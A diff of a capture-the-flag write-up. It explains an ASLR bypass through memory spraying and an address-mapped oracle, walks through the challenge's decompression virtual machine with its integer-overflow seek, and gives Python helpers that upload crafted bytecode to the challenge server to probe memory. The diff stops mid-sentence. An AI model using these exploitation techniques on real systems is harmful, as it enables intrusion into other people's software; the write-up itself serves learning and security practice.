@@ -99,20 +99,6 @@ To bypass ASLR you need:
   2. By finding and abusing an “amplification gadget”: a piece of code that takes an existing chunk of data and copies it, potentially multiple times, thus allowing the attacker to spray a large amount of memory by only sending a relatively small number of bytes.
 * An `isAddressMapped` oracle, which given an address tells you wheter or not that address is mapped.
 
-To 
-```python
-
-def find_mapped_address(a, b , sizeOfSpray):
-  for probeAddr in range(a, b, sizeOfSpray):
-    if isAddrMapped(probeAddr) == True:
-      print (f"Found mapped address: {probeAddr:#x}")
-      return probeAddr
-
-```
-
-for a total of `numOfQueries = (b - a + 1) // sizeOfSpray` queries to the oracle in the worst case.
-
-
 ### PoC of ASLR bypass on Linux
 
 On Linux, it is possible to completely break ASLR if you are able to allocate 16TB of memory.
@@ -146,7 +132,7 @@ int main()
 
 If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.
 
-| mem | boundary cross
+| mem | 16tb boundary cross?
 | - |-
 |0x7fb03b55e010| No
 |0x7fa03b55d010| No
@@ -165,7 +151,7 @@ If you look at the addresses returned by malloc you can better understand what i
 |0x7ed03b550010| Yes
 |0x7ec03b54f010| Yes
 
-The poc is exploiting the fact that, at some point, the most significant byte of the address returned changes from 7F to 7E.
+The poc is exploiting the fact that, at some point, the most significant byte of the address returned changes from 7F to 7E and since the allocations are contiguous there must be something inside that range. \(Yeah we are applying the [Bolzano-Weirstress theorem](https://en.wikipedia.org/wiki/Intermediate_value_theorem) to solve this problem!\)
 
 # 2 The challenge
 
@@ -338,13 +324,12 @@ static void do_decompress(char *out, char *in, size_t insize)
 You can view this function as a simple *virtual machine*, which executes the bytecode `in` and writes the output to `out`.
 
 This VM has 4 opcodes:
-* 0 -> NOP.
-* 
-* 1 -> STORE(u8 b). 
+* 0 -> NOP
+* 1 -> STORE(u8 b)
   
   writes `b` to `out`, increments out by `1`.
   
-  Implementation:
+  Opcode implementation:
   ```C
   case 1: {
       // Write byte
@@ -354,10 +339,11 @@ This VM has 4 opcodes:
   }
   ```   
 
-* 2 -> SEEK(u64 off):
+* 2 -> SEEK(u64 off)
+
   set `out` to `out + off`. 
   
-  `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called `integer overflow` and we can exploit this behaviour to always reach any 64 bit value. Example:
+  `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) and we can exploit this behaviour to always reach any 64 bit value. Example:
   ```py
   M64 = 0xFFFFFFFF_FFFFFFFF # maximum 64 bit value
   def get_off(out: int, target: int):
@@ -368,7 +354,7 @@ This VM has 4 opcodes:
   # Try it yourself :)
   ```
 
-  Implementation:
+  Opcode implementation:
   ```C
   case 2: {
     // Seek
@@ -382,7 +368,7 @@ This VM has 4 opcodes:
 * 3 -> LOAD(off, size). 
   Copy `size` bytes from `out - off` to `out`, increment `out` by 8.
 
-  Implementation:
+  Opcode implementation:
   ```C
   case 3: {
     // Copy some previously written bytes
@@ -441,38 +427,67 @@ class CompressedFile():
         self.cur += 17
         self.out += count & M64
 ```
+
 ## 4 Poking the challenge
 
-## 4.1 Inspect the memory on the challenge
-To do this, spawn a local instance of the challenge and read the process maps. That was my setup for the ctf:
-
-<p align="center"> <img src="./images/read-proc-mappings.png" ><br/> <i></i><p/> 
-
-### Linear scan the stack
-
-Let's try to target the stack range 0x00007fff_00000000 - 0x00007fff_ffffffff, because it is the smaller
+You can interact with the challenge using python requests, here is my code:
 ```py
-def getNumberOfQueries(a, b, size):
-    return (b - a + 1) // size
+import requests
 
-a = 0x00007f00_00000000
-b = 0x00007fff_ffffffff
+def uploadFile(blob: bytes, fileid: int):
+    assert (fileid < (1<<31) - 1)
 
+    multipart_form_data = {
+        'file': (f'payload_{fileid}', blob),
+    }
 
-size = 0x00000001_00000000 # 4gb of contiguous allocation
-print (getNumberOfQueries(a, b, size)) # 256
+    res = requests.post(
+        f"http://{SERVER_IP}:{SERVER_PORT}/upload/{fileid}",
+        files=multipart_form_data
+    )
+
+    return res
+
+def getFile(fileid: int, extract="true"):
+    res = requests.get(f"http://{SERVER_IP}:{SERVER_PORT}/files/{fileid}?extract={extract}")
+    return res
 ```
 
-Ok, that's good, we can find a mapped address with just 256 queries!
-Let's try to visualize what is happening:
+## 4.1 Inspect the memory mappings of the challenge
 
-| probeAddr    | |
-| -  | - | 
-| 7f00_00000000| +4gb
-| 7f01_00000000| +4gb
-| 7f02_00000000| +4gb
-| ...|
-| 7fff_00000000|
+To do this, you can spawn a local instance of the challenge and read the process maps after doing some operations.
 
-We are basically bruteforcing the 5th byte of the address, exploiting the fact that there must be a contiguous range of memory which is 4gb long. Don't worry if that's not clear enough for now, we're gonna try this on a real target.
+<p align="center"> <img src="./images/read-proc-mappings.png" ><br/> <i>Initial state</i><p/> 
 
+## 4.2 The isAddressMapped oracle
+
+We are given a read what where primitive, so building an isAddressMapped oracle is not hard at all.
+
+My way to do it was to build this bytecode:
+* `memcpy(out, targetAddress, 1)`
+* `write(b'A')`
+
+If targetAddress is not mapped, then memcpy segfaultes, so `write(b'A')` doesn't get called
+```py
+def isAddrMapped(addr, fileid, filelen=2):
+    toup = CompressedFile(filelen)
+    
+    # addr = OUT_ADDR - off
+    off = (OUT_ADDR - addr) & M64
+    # memcpy(toup.out, addr, 1)
+    toup.memcpy(off, 1)
+    # *(toup.out+1) = 0x41
+    toup.write(b'A')
+
+    uploadFile(toup.content, fileid)
+    res = getFile(fileid)
+    isMapped = res.content[1] == 0x41
+    
+    return isMapped
+```
+
+## 4.3 The memory spray primitive
+
+We can completely control the size of the decompressed file, and we get an mmap of that size in [MyController.cpp:62](resources/dist-guess-god/src/src/controller/MyController.cpp#L62). 
+
+After some trial and error it turns out that we can allocate 
